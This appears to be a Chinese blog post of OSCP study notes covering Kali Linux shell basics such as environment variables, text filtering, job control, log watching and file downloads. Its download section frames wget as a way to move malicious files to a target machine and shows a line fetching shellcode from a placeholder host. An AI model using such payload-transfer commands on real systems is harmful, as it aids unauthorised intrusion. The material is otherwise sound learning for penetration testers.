## Bash 环境

### 环境变量

当我们开启新的bash时候，它会拥有自己的环境变量

> 我是这样理解 环境变量的：  
> 每个程序都有自己运行的地址 我们用一个变量来储存它的地址 这个变量就叫环境变量

Kali 最常用的环境变量 就是 $PATH。这个我们可以用这个变量进行不正当配置二进制文件提权（以后文章可能会出现）

    
    
    ┌──(root@OSexp)-[~]
    └─# echo $PATH
    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
    
    ┌──(root@OSexp)-[~]
    └─# echo $USER
    root
    
    ┌──(root@OSexp)-[~]
    └─# echo $PWD 
    /root
    
    ┌──(root@OSexp)-[~]
    └─# echo $HOME
    /root
    

### export

我们可以通过 export 这个命令 来编辑临时变量  
关掉这个bash临时变量消失， **如果在bash里再开一个bash 临时变量可以继承**  
![export](https://image.3001.net/images/20220407/1649312402_624e82926c7930d1515ac.jpg!small)  
如果经常忘记ip地址 可以用这样来方便记住自己的ip

我们可以通过 **$$**来查看当前进程的ID  
env可以让我们查看当前Kali Linux默认的环境变量  
![env](https://image.3001.net/images/20220407/1649312490_624e82eaafab28ee625dd.png!small)

### alias

> alias
> 是一个我们可以定义的替换命令名的字符串。别名对于用我们定义的更短的命令或别名替换常用的命令和开关非常有用。换句话说，别名是我们定义自己的命令，由其他命令构建。这方面的一个例子是ls命令，我们通常倾向于使用ls-> la（显示结果在一个长列表中，包括隐藏的文件）。让我们来看看如何使用别名来替换此命令
    
    
    alias lsa = 'ls -la'
    alias pingip = 'ping -c 1 127.0.0.1'
    

### 历史记录

在最新的 Kali Linux 中通常用到的都是 zsh终端 而不是bash。现在网上有很多zsh的插件，师傅们可以自行去网上搜索 oh my
zsh等插件进行美化自己的终端。  
重点是现在的zsh 有历史记录，还有命令自动补全的功能，这个十分方便各位师傅们进行渗透操作。

    
    
    history # 查看历史记录
    history -c # 清空历史记录
    
    我们可以用 方向键 （上下）游览自己的记录 方向键（右） 自动补全记录
    
    在终端 输入 !! 回车 自动完成上一个命令
    

### 持久的Bash自定义

> Bash中的交互shell
> 的行为是由位于/etc/bash.bashrc中的系统范围的bashrc文件决定的。可以通过编辑位于任何用户的主目录中的.bashrc文件来覆盖系统范围内的Bash设置。（现在都在
> .zshrc ）

![image-20220407174510331](https://image.3001.net/images/20220407/1649324781_624eb2ed9b59fb37a517e.png!small)

## 管道和重定向

Stream Name| Description  
---|---  
Standard Input (STDIN)| Data fed into the program  
Standard Output (STDOUT)| Output from the program (defaults to terminal)  
Standard Error （STDERR)| Error messages (defaults to terminal)  
  
网上有很多师傅都写了教程，在这里我就不再重复了。下面是一些网址，供师傅们参考一下。

[Linux 重定向教程](http://c.biancheng.net/view/942.html)  
[Linux 管道命令教程](https://www.jianshu.com/p/9c0c2b57cb73)

## 文本的搜索和操作

我觉得这个挺重要的，在不借助很多工具的情况下，手动对文本信息进行筛选 是一个比较基础的能力。非常考验渗透人员的基本功。

### grep

grep 通常搭配管道操作符进行配合使用 ( | ) 来筛选我们需要的 文件 （可以使用正则，字符串）  
![grep](https://image.3001.net/images/20220407/1649313867_624e884b379b5cc47193c.jpg!small)

### sed  
sed 是一个非常强大的流编辑器。我们可以使用sed将文本在流中编辑我们的文本。

    
    
    echo "I need to try hard" | sed 's/hard/harder'
    > I need to try harder
    

### cut

这个命令非常简单，从字面的意思就知道是切割的意思，通常也是搭配管道操作符进行使用。  
常用的参数：  
 **-f** 选定区域的数字（从1开始算，不是从0开始算）  
 **-d** 以什么来划分区域

    
    
    echo "I am a Student" | cut -f 2 -d " "
    > am
    

### awk

这个命令太厉害了Orz，还没有非常好的掌握好，可以参考一些师傅的文章。  
[Linux awk
教程](https://blog.csdn.net/stpeace/article/details/46848873?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164931429916782246438022%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164931429916782246438022&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-46848873.142%5Ev5%5Epc_search_result_control_group,157%5Ev4%5Enew_style&utm_term=awk&spm=1018.2226.3001.4187)

### 其他命令

还有其他很厉害的命令 如sort uniq等。当命令一起组合的时候会有非常强大的功能。

[Linux sort
教程](https://blog.csdn.net/wade3015/article/details/92573738?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164932085816781685323199%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164932085816781685323199&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-92573738.142%5Ev6%5Econtrol,157%5Ev4%5Enew_style&utm_term=linux+sort&spm=1018.2226.3001.4187)

[Linux uniq
教程](https://blog.csdn.net/chinabestchina/article/details/84036350?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164931454316782094896877%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164931454316782094896877&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-84036350.142%5Ev6%5Econtrol,157%5Ev4%5Enew_style&utm_term=uniq+%E5%91%BD%E4%BB%A4&spm=1018.2226.3001.4187)

## 编辑你的文本

本人比较喜欢用vim来编辑文本，比较轻巧快捷。（但是在反弹shell sh环境中vi有几率会卡死，不知道有没有大佬会遇到这种问题）

OSCP考试书推荐两种编辑器：nano、vim/vi

[Linux nano
教程](https://blog.csdn.net/u012561176/article/details/45829223?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164931485516782094845407%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164931485516782094845407&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-45829223.142%5Ev6%5Econtrol,157%5Ev4%5Enew_style&utm_term=nano+%E7%BC%96%E8%BE%91%E5%99%A8&spm=1018.2226.3001.4187)

[Linux VIM/VI
教程](https://blog.csdn.net/xing851483876/article/details/84553945?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164931479616780271985605%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164931479616780271985605&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-84553945.142%5Ev6%5Econtrol,157%5Ev4%5Enew_style&utm_term=vim+%E7%BC%96%E8%BE%91%E5%99%A8&spm=1018.2226.3001.4187)

## 对比文件

> 在很多情况中，如蓝队、运维的时候需要对比昨天日志和今天日志有什么敏感操作，判断服务器是否中马

### comm

    
    
    comm file1 file2
    file1的不同之处|file2的不同之处|file1,file2相同之处
    
    comm -12 file1 file2
    直接忽略不同之处 直接输出相同之处
    
    

![](https://image.3001.net/images/20220407/1649324785_624eb2f1e83fcb6546498.png!small)

### diff && vimdiff

与之comm相反的命令就是 diff 这个命令我没有太过多去了解，师傅们可以先去了解一下。

[Linux diff && vimdiff
教程](https://blog.csdn.net/rangf/article/details/6459271?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164932292116782089379859%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164932292116782089379859&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-6459271.142%5Ev6%5Econtrol,157%5Ev4%5Enew_style&utm_term=vimdiff&spm=1018.2226.3001.4187)

## 管理进程

> Linux内核通过使用进程来管理多任务处理。内核维护关于每个进程的信息，以帮助保持组织，每个进程被分配一个称为进程ID(PID)的数字

###

### bg(backgrouding processes)

查看后台有什么程序 我们用的是 **bg** 这个命令

创建后台进程的最快方法是在命令的末尾追加一个&号和（&），以便在命令启动后立即将其发送到后台。让我们试试一个简单的例子：

    
    
    kali@kali:~$ ping -c 400 localhost > ping_results.txt &
    

第二种挂起的方法 (ctrl + z)

    
    
    kali@kali:~$ ping -c 400 localhost > ping_results.txt
    ^Z
    [1]+ Stopped ping -c 400 localhost > ping_results.txt
    kali@kali:~$ bg
    [1]+ ping -c 400 localhost > ping_results.txt
    kali@kali:~$
    

### fg

我们在后台挂起的程序，我们用 **fg** 这个命令重新唤醒

    
    
    kali@kali:~$ ping -c 400 localhost > ping_results.txt
    ^Z
    [1]+ Stopped ping -c 400 localhost > ping_results.txt
    kali@kali:~$ find / -name sbd.exe
    ^Z
    [2]+ Stopped find / -name sbd.exe
    kali@kali:~$ jobs
    [1]- Stopped ping -c 400 localhost > ping_results.txt
    [2]+ Stopped find / -name sbd.exe
    kali@kali:~$ fg %1
    ping -c 400 localhost > ping_results.txt
    ^C
    kali@kali:~$ jobs
    [2]+ Stopped find / -name sbd.exe
    kali@kali:~$ fg
    find / -name sbd.exe
    /usr/share/windows-resources/sbd/sbd.exe
    

### ps(process status) && kill

进程管理

    
    
    # 通常我们都会用ps 来查看我们的进程
    ps -ef # -e 选中所有进程 -f 输出所有格式的列表(UID,PID,PPID等)
    
    # 如果我们要杀掉进程的话
    kill <process pid>
    # 强制杀掉进程
    kill -9 <process pid>
    

## 文件和命令监控

### tail

> tail
> 最常见的用途是在写入日志文件条目时监视它们。例如，我们可能希望监视Apache日志，以查看我们是否试图通过客户端漏洞攻击一个web服务器。这个例子将会这样做：
    
    
    kali@kali:~$ sudo tail -f /var/log/apache2/access.log 
    127.0.0.1 - - [02/Feb/2022:12:18:14 -0500] "GET / HTTP/1.1" 200 3380 "-" "Mozilla/5.0 
    (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
    127.0.0.1 - - [02/Feb/2022:12:18:14 -0500] "GET /icons/openlogo-75.png HTTP/1.1" 200 6
    040 "http://127.0.0.1/" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firef
    ox/52.0"
    127.0.0.1 - - [02/Feb/2022:12:18:15 -0500] "GET /favicon.ico HTTP/1.1" 404 500 "-" "Mo
    zilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
    

**-f** 参数 随着目标文件的增长，不断地更新输出

 **-nX** 参数 输出后 X行，如果有就会取代默认的10行输出

### watch

> 用于定期运行一个指定的命令

[Linux watch
命令教程](https://blog.csdn.net/u013907419/article/details/86510838?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164932391416780261938184%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164932391416780261938184&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-86510838.142%5Ev6%5Econtrol,157%5Ev4%5Enew_style&utm_term=linux+watch%E5%91%BD%E4%BB%A4&spm=1018.2226.3001.4187)

    
    
    watch -n <seconds> <command>
    example:
    watch -n 1 netstat -ant
    

## 下载文件

> 我们在攻击机开启了http服务，我们通常就需要将恶意文件传输到目标机。

### wget

> wget将广泛使用，使用HTTP/HTTPS和FTP协议下载文件
    
    
    wget -O <file_location> <URL>
    wget -O /tmp/payload.txt https://example.com/shellcode.txt
    # 请务必要看清楚 file_location 是否有写入权限
    

### curl

>
> 一种使用IMAP/S、POP3/S、PS、SCP、SFTP、SMB/S、SMTP/S、telnet、TFTP等S系列协议向服务器传输数据的工具。渗透测试人员可以使用它来下载或上传文件，并构建复杂的请求。
    
    
    curl -o <file_location> <URL>
    

### axel

> axel
> 是一个下载加速器，它通过多个连接从FTP或HTTP服务器传输文件。这个工具有大量的特性，但最常见的是-n，它用于指定要使用的多个连接的数量。在下面的示例中，我们还使用-> a选项来表示更简洁的进度指示器，并使用-o来为下载的文件指定不同的文件名。
    
    
    kali@kali:~$ axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
    

